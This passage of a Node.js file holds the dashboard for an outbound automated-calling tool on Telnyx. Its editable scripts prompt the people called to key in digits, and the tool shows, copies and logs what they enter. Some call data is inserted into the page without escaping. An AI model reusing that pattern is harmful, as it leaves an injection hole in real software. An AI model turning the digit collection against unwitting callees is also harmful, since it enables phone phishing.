.btn-auto{padding:9px 11px;background:none;border:1px solid var(--border);border-radius:8px;color:var(--text2);font-size:11px;font-weight:600;cursor:pointer;white-space:nowrap;transition:all .15s}
.btn-auto:hover{border-color:var(--cyan2);color:var(--cyan2)}
.voice-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;margin-top:8px}
.vo{position:relative;padding:10px 11px;background:var(--panel2);border:2px solid var(--border);border-radius:9px;cursor:pointer;transition:all .15s}
.vo:has(input:checked){border-color:var(--cyan2);background:#f0f9ff}
.vo input{position:absolute;opacity:0;width:0;height:0}
.vo-name{font-size:12px;font-weight:700}
.vo-desc{font-size:10px;color:var(--text2);margin-top:1px}
.help-box{background:rgba(14,165,233,.06);border:1px solid rgba(14,165,233,.2);border-radius:10px;padding:14px;margin-bottom:14px;font-size:12px;color:var(--text2);line-height:1.7}
.help-box strong{color:var(--cyan2)}
</style>
</head>
<body>
<div class="app">

<!-- SIDEBAR -->
<aside class="sidebar">
  <div class="logo">
    <div class="logo-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round">
        <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 11.5a19.79 19.79 0 01-3.07-8.67A2 2 0 012 .84h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 8.14a16 16 0 006.29 6.29l1.42-1.42a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/>
      </svg>
    </div>
    <div>
      <div class="logo-name" id="co-name">IVR PRO</div>
      <div class="logo-sub">Telnyx</div>
    </div>
  </div>

  <div class="dialer">
    <div class="s-label">New Call</div>
    <div class="field">
      <label>Phone Number</label>
      <input type="tel" id="phoneInput" placeholder="+1 555 000 0000"/>
    </div>
    <div class="field">
      <label>Label (optional)</label>
      <input type="text" id="labelInput" placeholder="e.g. Invoice #042"/>
    </div>
    <div class="field">
      <label>Script</label>
      <select id="scriptSelect"></select>
    </div>
    <!-- Dialpad -->
    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:5px;margin-bottom:8px">
      <button class="key-btn" onclick="dialKey('1')"><span>1</span></button>
      <button class="key-btn" onclick="dialKey('2')"><span>2</span><small>ABC</small></button>
      <button class="key-btn" onclick="dialKey('3')"><span>3</span><small>DEF</small></button>
      <button class="key-btn" onclick="dialKey('4')"><span>4</span><small>GHI</small></button>
      <button class="key-btn" onclick="dialKey('5')"><span>5</span><small>JKL</small></button>
      <button class="key-btn" onclick="dialKey('6')"><span>6</span><small>MNO</small></button>
      <button class="key-btn" onclick="dialKey('7')"><span>7</span><small>PQRS</small></button>
      <button class="key-btn" onclick="dialKey('8')"><span>8</span><small>TUV</small></button>
      <button class="key-btn" onclick="dialKey('9')"><span>9</span><small>WXYZ</small></button>
      <button class="key-btn" onclick="dialKey('*')"><span>*</span></button>
      <button class="key-btn" onclick="dialKey('0')"><span>0</span></button>
      <button class="key-btn" onclick="dialDel()"><span>⌫</span></button>
    </div>
    <button class="btn-call" id="callBtn" onclick="initiateCall()">
      <span id="callBtnIcon">📞</span>
      <span id="callBtnText">CALL NOW</span>
    </button>
    <button class="btn-test" onclick="testConn()">🔍 Test Connection</button>
    <div class="msg" id="callMsg"></div>
  </div>

  <div class="stats">
    <div class="stats-row">
      <div class="stat"><div class="stat-n" id="st-active" style="color:var(--cyan)">0</div><div class="stat-l">Active</div></div>
      <div class="stat"><div class="stat-n" id="st-total" style="color:var(--purple)">0</div><div class="stat-l">Today</div></div>
      <div class="stat"><div class="stat-n" id="st-done" style="color:var(--green)">0</div><div class="stat-l">Done</div></div>
    </div>
    <div class="live-pill"><div class="dot"></div>Live · updates every 2s</div>
  </div>
</aside>

<!-- MAIN -->
<main class="main">
  <nav class="tabs">
    <button class="tab active" onclick="switchTab('monitor',this)">📊 Monitor</button>
    <button class="tab" onclick="switchTab('scripts',this)">📋 Scripts</button>
    <button class="tab" onclick="switchTab('logs',this)">📁 Logs</button>
    <button class="tab" onclick="switchTab('settings',this)">⚙️ Settings</button>
  </nav>

  <!-- MONITOR -->
  <div id="panel-monitor" class="panel active">
    <div class="ph">
      <div><div class="ph-title">Live Call Monitor</div><div class="ph-sub">Calls update every 2 seconds</div></div>
    </div>
    <div id="mon-grid" class="mon-grid">
      <div class="empty" id="empty-mon">
        <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 11.5a19.79 19.79 0 01-3.07-8.67A2 2 0 012 .84h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 8.14a16 16 0 006.29 6.29l1.42-1.42a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/></svg>
        <div class="empty-t">No active calls</div>
        <div class="empty-s">Enter a phone number in the sidebar<br>and click CALL NOW</div>
      </div>
    </div>
  </div>

  <!-- SCRIPTS -->
  <div id="panel-scripts" class="panel">
    <div class="ph"><div><div class="ph-title">Script Builder</div><div class="ph-sub">Build call scripts — templates are read-only, save as new to customise</div></div></div>
    <div id="slib" class="slib"></div>
    <div class="sname-bar">
      <input class="sname-inp" id="sname" placeholder="Script name..."/>
    </div>
    <div class="sec">
      <div class="sec-title">Opening Greeting</div>
      <div class="grid2">
        <div class="ff full"><label>What the bot says first</label><textarea id="s-gmsg" rows="2"></textarea></div>
        <div class="ff"><label>Timeout (seconds)</label><input type="number" id="s-gtimeout" value="10" min="5" max="60"/></div>
        <div class="ff"><label>No-input message</label><input type="text" id="s-gnoinput"/></div>
      </div>
    </div>
    <div class="sec">
      <div class="sec-title">Collection Steps</div>
      <div id="steps-list"></div>
      <button class="btn-add" onclick="addStep()">+ Add Step</button>
    </div>
    <div class="sec">
      <div class="sec-title">Completion Messages</div>
      <div class="grid2">
        <div class="ff full"><label>✅ Success — all steps done</label><textarea id="s-success" rows="2"></textarea></div>
        <div class="ff full"><label>❌ Cancel — caller pressed 2</label><textarea id="s-cancel" rows="2"></textarea></div>
        <div class="ff full"><label>⏱ Timeout — no input received</label><textarea id="s-error" rows="2"></textarea></div>
      </div>
    </div>
    <div class="save-row">
      <button class="btn-save" onclick="saveScript()">💾 Save Script</button>
      <button class="btn-save sec2" onclick="saveAsNew()">＋ Save as New</button>
      <span class="saved-ok" id="script-ok">✓ Saved!</span>
    </div>
  </div>

  <!-- LOGS -->
  <div id="panel-logs" class="panel">
    <div class="ph">
      <div><div class="ph-title">Call Logs</div><div class="ph-sub">Full history with collected data</div></div>
      <button class="btn-danger" onclick="clearAllLogs()">🗑 Clear All</button>
    </div>
    <div id="logs-container"></div>
  </div>

  <!-- SETTINGS -->
  <div id="panel-settings" class="panel">
    <div class="ph"><div><div class="ph-title">Settings</div><div class="ph-sub">Configure your Telnyx credentials</div></div></div>

    <div class="help-box">
      <strong>How to set up Telnyx:</strong><br>
      1. Sign up at <a href="https://telnyx.com" target="_blank" style="color:var(--cyan2)">telnyx.com</a> → Go to <strong>API Keys</strong> and create a key<br>
      2. Go to <strong>Numbers</strong> → Buy a phone number<br>
      3. Go to <strong>Voice → TeXML Apps</strong> → Create an app → set the URL to your server URL + <code style="background:rgba(0,0,0,.06);padding:1px 5px;border-radius:3px">/twiml/start</code><br>
      4. Copy the <strong>Connection ID</strong> from that TeXML App
    </div>

    <div class="sec">
      <div class="sec-title">Telnyx Credentials</div>
      <div class="grid2">
        <div class="ff full"><label>Company Name</label><input type="text" id="cfg-company" placeholder="My Company"/></div>
        <div class="ff full"><label>API Key</label><input type="password" id="cfg-apikey" placeholder="KEY..."/><span class="note">From <a href="https://portal.telnyx.com/#/app/api-keys" target="_blank">portal.telnyx.com</a> → API Keys</span></div>
        <div class="ff"><label>TeXML App Connection ID</label><input type="text" id="cfg-connid" placeholder="1234567890"/><span class="note">From Voice → TeXML Apps → your app</span></div>
        <div class="ff"><label>Your Telnyx Phone Number</label><input type="tel" id="cfg-from" placeholder="+15551234567"/></div>
        <div class="ff full"><label>Server Public URL (your Render URL)</label>
          <div class="url-row">
            <input type="text" id="cfg-baseurl" placeholder="https://your-app.onrender.com"/>
            <button class="btn-auto" onclick="document.getElementById('cfg-baseurl').value=window.location.origin">Auto</button>
          </div>
          <span class="note">Telnyx will send calls to this URL. Also use this in your TeXML App webhook.</span>
        </div>
      </div>
    </div>

    <div class="sec">
      <div class="sec-title">Voice</div>
      <div class="voice-grid" id="voice-grid"></div>
    </div>

    <div class="save-row">
      <button class="btn-save" onclick="saveSettings()">💾 Save Settings</button>
      <span class="saved-ok" id="settings-ok">✓ Saved!</span>
    </div>
  </div>
</main>
</div>

<script>
// ─── State ────────────────────────────────────────────────────────────────────
var settings = {};
var scripts = [];
var sessions = [];
var logs = [];
var editId = null;
var editSteps = [];

var VOICES = [
  {id:"en-US-Standard-B",name:"US Male",desc:"Standard male"},
  {id:"en-US-Standard-C",name:"US Female",desc:"Standard female"},
  {id:"en-US-Standard-D",name:"US Male 2",desc:"Deep male"},
  {id:"en-US-Standard-E",name:"US Female 2",desc:"Soft female"},
  {id:"en-GB-Standard-A",name:"UK Female",desc:"British female"},
  {id:"en-GB-Standard-B",name:"UK Male",desc:"British male"},
  {id:"en-AU-Standard-A",name:"AU Female",desc:"Australian female"},
  {id:"en-AU-Standard-B",name:"AU Male",desc:"Australian male"},
  {id:"alice",name:"Alice",desc:"Twilio classic"},
  {id:"man",name:"Man",desc:"Twilio basic"}
];

var SEED_IDS = ["s-default","s-payment","s-survey"];

// ─── Tab switching ─────────────────────────────────────────────────────────────
function switchTab(id, btn) {
  document.querySelectorAll('.panel').forEach(function(p){ p.classList.remove('active'); });
  document.querySelectorAll('.tab').forEach(function(t){ t.classList.remove('active'); });
  document.getElementById('panel-' + id).classList.add('active');
  btn.classList.add('active');
  if (id === 'logs') loadLogsUI();
}

// ─── Settings ─────────────────────────────────────────────────────────────────
function loadSettingsUI() {
  fetch('/api/settings').then(function(r){ return r.json(); }).then(function(s) {
    settings = s;
    document.getElementById('cfg-company').value = s.companyName || '';
    document.getElementById('cfg-apikey').value = s.apiKey || '';
    document.getElementById('cfg-connid').value = s.connectionId || '';
    document.getElementById('cfg-from').value = s.fromNumber || '';
    document.getElementById('cfg-baseurl').value = s.baseUrl || '';
    document.getElementById('co-name').textContent = s.companyName || 'IVR PRO';
    renderVoices(s.voice || 'en-US-Standard-C');
  });
}

function saveSettings() {
  var p = {
    companyName: document.getElementById('cfg-company').value,
    apiKey: document.getElementById('cfg-apikey').value,
    connectionId: document.getElementById('cfg-connid').value,
    fromNumber: document.getElementById('cfg-from').value,
    baseUrl: document.getElementById('cfg-baseurl').value,
    voice: (document.querySelector('input[name="voice"]:checked') || {value:'en-US-Standard-C'}).value
  };
  fetch('/api/settings',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)})
    .then(function(){ document.getElementById('co-name').textContent = p.companyName||'IVR PRO'; showOk('settings-ok'); });
}

function renderVoices(sel) {
  document.getElementById('voice-grid').innerHTML = VOICES.map(function(v) {
    return '<label class="vo"><input type="radio" name="voice" value="'+v.id+'" '+(v.id===sel?'checked':'')+'>'+
      '<div class="vo-name">'+v.name+'</div><div class="vo-desc">'+v.desc+'</div></label>';
  }).join('');
}

// ─── Scripts ──────────────────────────────────────────────────────────────────
function loadScriptsUI() {
  fetch('/api/scripts').then(function(r){ return r.json(); }).then(function(s) {
    scripts = s;
    renderScriptLib();
    renderScriptSelect();
    var def = scripts.find(function(x){ return x.isDefault; }) || scripts[0];
    if (def) loadEditor(def);
  });
}

function renderScriptLib() {
  var html = scripts.map(function(s) {
    var isSeed = SEED_IDS.indexOf(s.id) >= 0;
    var delBtn = (!isSeed) ? '<button class="btn-sc del" onclick="event.stopPropagation();delScript(\''+s.id+'\')">Del</button>' : '';
    return '<div class="scard'+(s.id===editId?' sel':'')+(s.isDefault?' is-default':'')+'" onclick="loadEditorById(\''+s.id+'\')">' +
      '<div class="scard-t"><div class="scard-name">'+esc(s.name)+'</div>'+(isSeed?'<span class="scard-tag">TPL</span>':'')+'</div>'+
      '<div class="scard-meta">'+(s.steps||[]).length+' steps · '+(s.isDefault?'<b style="color:var(--cyan2)">Default</b>':'inactive')+'</div>'+
      '<div class="scard-btns">'+
        '<button class="btn-sc def" onclick="event.stopPropagation();setDefault(\''+s.id+'\')">'+( s.isDefault?'✓ Default':'Set Default')+'</button>'+
        delBtn+
      '</div>'+
      '</div>';
  }).join('');
  html += '<div class="scard scard-new" onclick="newScript()"><div style="font-size:24px;opacity:.4">＋</div><div style="font-size:12px;font-weight:600;margin-top:4px">New Script</div></div>';
  document.getElementById('slib').innerHTML = html;
}

function renderScriptSelect() {
  document.getElementById('scriptSelect').innerHTML = scripts.map(function(s) {
    return '<option value="'+s.id+'">'+esc(s.name)+(s.isDefault?' ★':'')+'</option>';
  }).join('');
  var def = scripts.find(function(x){ return x.isDefault; });
  if (def) document.getElementById('scriptSelect').value = def.id;
}

function loadEditorById(id) {
  var s = scripts.find(function(x){ return x.id===id; });
  if (s) loadEditor(s);
}

function loadEditor(s) {
  editId = s.id;
  document.getElementById('sname').value = s.name || '';
  document.getElementById('s-gmsg').value = (s.greeting && s.greeting.message) || '';
  document.getElementById('s-gtimeout').value = (s.greeting && s.greeting.timeout) || 10;
  document.getElementById('s-gnoinput').value = (s.greeting && s.greeting.noInputMessage) || '';
  document.getElementById('s-success').value = s.successMessage || '';
  document.getElementById('s-cancel').value = s.cancelMessage || '';
  document.getElementById('s-error').value = s.errorMessage || '';
  editSteps = s.steps ? JSON.parse(JSON.stringify(s.steps)) : [];
  renderSteps();
  renderScriptLib();
}

function newScript() {
  editId = null;
  document.getElementById('sname').value = 'New Script';
  document.getElementById('s-gmsg').value = 'Hello! Press 1 to continue, or press 2 to end this call.';
  document.getElementById('s-gtimeout').value = 10;
  document.getElementById('s-gnoinput').value = 'We did not receive your input. Goodbye.';
  document.getElementById('s-success').value = 'Thank you. Your information has been received. Goodbye.';
  document.getElementById('s-cancel').value = 'No problem. Goodbye.';
  document.getElementById('s-error').value = 'We did not receive your input. Goodbye.';
  editSteps = [{label:'Step 1',message:'',maxDigits:5,timeout:15,confirmMessage:'Thank you. '}];
  renderSteps();
}

function buildPayload() {
  var cards = document.querySelectorAll('.step-card');
  var steps = Array.from(cards).map(function(c,i){
    return {
      label: c.querySelector('.step-name').value || ('Step '+(i+1)),
      message: c.querySelector('.step-msg').value,
      maxDigits: parseInt(c.querySelector('.step-digits').value)||5,
      timeout: parseInt(c.querySelector('.step-timeout').value)||15,
      confirmMessage: c.querySelector('.step-confirm').value
    };
  });
  return {
    name: document.getElementById('sname').value||'Unnamed',
    greeting:{
      message: document.getElementById('s-gmsg').value,
      timeout: parseInt(document.getElementById('s-gtimeout').value)||10,
      noInputMessage: document.getElementById('s-gnoinput').value
    },
    steps: steps,
    successMessage: document.getElementById('s-success').value,
    cancelMessage: document.getElementById('s-cancel').value,
    errorMessage: document.getElementById('s-error').value
  };
}

function saveScript() {
  var data = buildPayload(); data.id = editId;
  fetch('/api/scripts',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
    .then(function(r){ return r.json(); }).then(function(res){
      scripts = res.scripts; renderScriptLib(); renderScriptSelect(); showOk('script-ok');
    });
}

function saveAsNew() {
  var data = buildPayload(); data.id = null;
  fetch('/api/scripts',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
    .then(function(r){ return r.json(); }).then(function(res){
      scripts = res.scripts;
      var newest = scripts[scripts.length-1]; editId = newest.id;
      renderScriptLib(); renderScriptSelect(); showOk('script-ok');
    });
}

function setDefault(id) {
  fetch('/api/scripts/'+id+'/setdefault',{method:'POST'})
    .then(function(){ return fetch('/api/scripts'); })
    .then(function(r){ return r.json(); })
    .then(function(s){ scripts=s; renderScriptLib(); renderScriptSelect(); });
}

function delScript(id) {
  if (!confirm('Delete this script?')) return;
  fetch('/api/scripts/'+id,{method:'DELETE'}).then(function(r){ return r.json(); }).then(function(res){
    scripts = res.scripts;
    if (editId===id) loadEditor(scripts.find(function(x){ return x.isDefault; })||scripts[0]);
    renderScriptLib(); renderScriptSelect();
  });
}

function renderSteps() {
  document.getElementById('steps-list').innerHTML = editSteps.map(function(s,i){
    return '<div class="step-card">'+
      '<div class="step-hd">'+
        '<div class="step-n">'+(i+1)+'</div>'+
        '<input class="step-name" value="'+esc(s.label)+'" placeholder="Step name"/>'+
        '<button class="btn-rm" onclick="rmStep('+i+')">×</button>'+
      '</div>'+
      '<div class="sg">'+
        '<div class="sf full"><label>What the bot says</label><textarea class="step-msg" rows="2" placeholder="Please enter...">'+esc(s.message)+'</textarea></div>'+
        '<div class="sf"><label>Max digits</label><input type="number" class="step-digits" value="'+(s.maxDigits||5)+'" min="1" max="20"/></div>'+
        '<div class="sf"><label>Timeout (s)</label><input type="number" class="step-timeout" value="'+(s.timeout||15)+'" min="5" max="60"/></div>'+
        '<div class="sf full"><label>Confirmation after input</label><input type="text" class="step-confirm" value="'+esc(s.confirmMessage||'')+'"/></div>'+
      '</div>'+
      '</div>';
  }).join('');
}

function addStep(){
  editSteps.push({label:'Step '+(editSteps.length+1),message:'',maxDigits:5,timeout:15,confirmMessage:'Thank you. '});
  renderSteps();
}
function rmStep(i){
  if(editSteps.length<=1){alert('Need at least one step.');return;}
  editSteps.splice(i,1); renderSteps();
}

// ─── Call ─────────────────────────────────────────────────────────────────────
function dialKey(k) {
  var inp = document.getElementById('phoneInput');
  inp.value = (inp.value || '') + k;
}
function dialDel() {
  var inp = document.getElementById('phoneInput');
  inp.value = inp.value.slice(0, -1);
}

function initiateCall() {
  var phone = document.getElementById('phoneInput').value.trim();
  var label = document.getElementById('labelInput').value.trim();
  var scriptId = document.getElementById('scriptSelect').value;
  if (!phone) { showMsg('Please enter a phone number.','err'); return; }
  var btn = document.getElementById('callBtn');
  btn.disabled = true;
  document.getElementById('callBtnText').textContent = 'CALLING...';
  document.getElementById('callBtnIcon').textContent = '⏳';
  hideMsg();
  fetch('/api/call',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phoneNumber:phone,label:label||'Call',scriptId:scriptId})})
    .then(function(r){ return r.json(); }).then(function(d) {
      if (d.success) {
        showMsg('✅ Call started!','ok');
        document.getElementById('phoneInput').value='';
        document.getElementById('labelInput').value='';
        setTimeout(function(){ hideMsg(); },4000);
      } else {
        showMsg('❌ '+( d.error||'Error'),'err');
      }
      btn.disabled=false;
      document.getElementById('callBtnText').textContent='CALL NOW';
      document.getElementById('callBtnIcon').textContent='📞';
    }).catch(function(){
      showMsg('❌ Cannot connect to server.','err');
      btn.disabled=false;
      document.getElementById('callBtnText').textContent='CALL NOW';
      document.getElementById('callBtnIcon').textContent='📞';
    });
}

function endCall(sid) {
  fetch('/api/call/'+sid+'/end',{method:'POST'}).then(function(r){ return r.json(); })
    .then(function(d){ if(!d.success) alert('Could not end call: '+d.error); });
}

function testConn() {
  showMsg('⏳ Testing...','info');
  fetch('/api/test').then(function(r){ return r.json(); }).then(function(d){
    if(d.ok) showMsg('✅ '+d.message,'ok'); else showMsg('❌ '+d.error,'err');
  }).catch(function(){ showMsg('❌ Cannot reach server.','err'); });
}

function showMsg(txt,type){ var e=document.getElementById('callMsg'); e.textContent=txt; e.className='msg '+type; e.style.display='block'; }
function hideMsg(){ var e=document.getElementById('callMsg'); e.style.display='none'; e.className='msg'; }

document.getElementById('phoneInput').addEventListener('keypress',function(e){ if(e.key==='Enter') initiateCall(); });

// ─── Monitor ──────────────────────────────────────────────────────────────────
function pollSessions() {
  fetch('/api/sessions').then(function(r){ return r.json(); }).then(function(s){
    sessions=s; renderMonitor();
    document.getElementById('st-active').textContent=s.filter(function(x){ return ['in-progress','initiated','ringing'].includes(x.status); }).length;
    document.getElementById('st-total').textContent=s.length;
    document.getElementById('st-done').textContent=s.filter(function(x){ return x.status==='completed'; }).length;
  }).catch(function(){});
}

function renderMonitor() {
  var grid=document.getElementById('mon-grid');
  var empty=document.getElementById('empty-mon');
  if(!sessions.length){ empty.style.display='flex'; return; }
  empty.style.display='none';
  sessions.forEach(function(s){
    var id='mc-'+s.callSid;
    var card=document.getElementById(id);
    if(!card){ card=document.createElement('div'); card.id=id; grid.insertBefore(card,grid.firstChild); }
    var isAct=['in-progress','initiated','ringing'].includes(s.status);
    var badge='<span class="badge badge-'+s.status+'"><span class="bdot'+(isAct?' bdot-p':'')+'"></span>'+s.status.replace(/-/g,' ').toUpperCase()+'</span>';
    var prog='';
    if(s.steps>0){
      prog='<div class="prog">';
      for(var i=0;i<s.steps;i++){
        var cl=i<s.collected.length?'done':(i===s.collected.length&&isAct?'act':'');
        prog+='<div class="pseg '+cl+'"></div>';
      }
      prog+='</div>';
    }
    var coll='';
    if(s.collected.length){
      coll='<div class="coll-list">';
      s.collected.forEach(function(c){
        coll+='<div class="ci"><span class="ci-l">'+c.label+'</span><span class="ci-v">'+c.value+'</span><span class="ci-t">'+new Date(c.time).toLocaleTimeString()+'</span></div>';
      });
      coll+='</div>';
    }
    var dur=s.duration?(Math.floor(s.duration/60)+'m '+(s.duration%60)+'s'):(isAct?'<span style="color:var(--cyan2)">● Live</span>':'—');
    var endBtn=isAct?'<button class="btn-sm end" onclick="endCall(\''+s.callSid+'\')">⏹ End</button>':'';
    var cpBtn=s.collected.length?'<button class="btn-sm" onclick="copyData(\''+s.callSid+'\')">📋 Copy</button>':'';
    var sline=s.statusDetail?'<div class="sline"><span class="sdot'+(isAct?' a':'')+'"></span>'+s.statusDetail+'</div>':'';
    card.className='ccard s-'+s.status.replace(/[^a-z-]/g,'');
    card.innerHTML='<div class="ch"><div><div class="cphone">'+s.phone+'</div><div class="clabel">'+s.label+' · '+( s.scriptName||'')+'</div></div><div class="cr"><div class="ctime">'+new Date(s.startTime).toLocaleTimeString()+'</div>'+badge+'</div></div>'+
      '<div class="cb">'+prog+coll+sline+'</div>'+
      '<div class="cf"><div class="cf-txt">'+dur+'</div><div class="cf-btns">'+endBtn+cpBtn+'</div></div>';
  });
}

function copyData(sid){
  var s=sessions.find(function(x){ return x.callSid===sid; }); if(!s) return;
  var lines=['Phone: '+s.phone,'Label: '+s.label,'Time: '+new Date(s.startTime).toLocaleString(),''];
  s.collected.forEach(function(c){ lines.push(c.label+': '+c.value); });
  navigator.clipboard.writeText(lines.join('\\n'));
}

// ─── Logs ─────────────────────────────────────────────────────────────────────
function loadLogsUI() {
  fetch('/api/logs').then(function(r){ return r.json(); }).then(function(l){ logs=l; renderLogs(); });
}

function renderLogs() {
  var c=document.getElementById('logs-container');
  if(!logs.length){ c.innerHTML='<div class="no-data">📭 No call logs yet</div>'; return; }
  var rows=logs.map(function(l){
    var dur=l.duration?(Math.floor(l.duration/60)+'m '+(l.duration%60)+'s'):'—';
    var t=new Date(l.startTime).toLocaleString();
    var hasData=l.collected&&l.collected.length>0;
    var det='';
    if(hasData){
      var chips=l.collected.map(function(c){ return '<div class="chip"><div class="chip-l">'+c.label+'</div><div class="chip-v">'+c.value+'</div></div>'; }).join('');
      det='<tr class="det-row" id="dr-'+l.id+'"><td colspan="7" class="det-cell"><div class="chips">'+chips+'</div></td></tr>';
    }
    return '<tr>'+
      '<td style="font-family:var(--mono);font-weight:700">'+l.phone+'</td>'+
      '<td>'+l.label+'</td>'+
      '<td style="color:var(--text2);font-size:11px">'+(l.scriptName||'—')+'</td>'+
      '<td><span class="badge badge-'+l.status+'" style="font-size:9px">'+l.status.replace(/-/g,' ').toUpperCase()+'</span></td>'+
      '<td class="dur">'+dur+'</td>'+
      '<td style="color:var(--text2);font-size:11px">'+t+'</td>'+
      '<td>'+(hasData?'<button class="det-btn" onclick="togDet(\''+l.id+'\')">View ▾</button>':'—')+'</td>'+
      '<td><button class="btn-sm" style="color:var(--red);border-color:rgba(239,68,68,.3)" onclick="delLog(\''+l.id+'\')">🗑</button></td>'+
      '</tr>'+det;
  }).join('');
  c.innerHTML='<div class="log-wrap"><table class="log-table"><thead><tr><th>Phone</th><th>Label</th><th>Script</th><th>Status</th><th>Duration</th><th>Time</th><th>Data</th><th></th></tr></thead><tbody>'+rows+'</tbody></table></div>';
}

function togDet(id){ var e=document.getElementById('dr-'+id); if(e) e.classList.toggle('on'); }
function delLog(id){
  fetch('/api/logs/'+id,{method:'DELETE'}).then(function(){ logs=logs.filter(function(l){ return l.id!==id; }); renderLogs(); });
}
function clearAllLogs(){
  if(!confirm('Clear all logs?')) return;
  fetch('/api/logs',{method:'DELETE'}).then(function(){ logs=[]; renderLogs(); });
}

// ─── Utils ────────────────────────────────────────────────────────────────────
function esc(s){ return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
function showOk(id){ var e=document.getElementById(id); e.classList.add('on'); setTimeout(function(){ e.classList.remove('on'); },2500); }

// ─── Init ─────────────────────────────────────────────────────────────────────
loadSettingsUI();
loadScriptsUI();
pollSessions();
setInterval(pollSessions, 2000);
</script>
</body>
</html>`;

app.get("/", (req,res) => {
  publicUrl(req); // cache the URL
  res.setHeader("Content-Type","text/html");
  res.send(DASHBOARD_HTML);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("\n✅ IVR Pro (Telnyx) → http://localhost:" + PORT + "\n"));
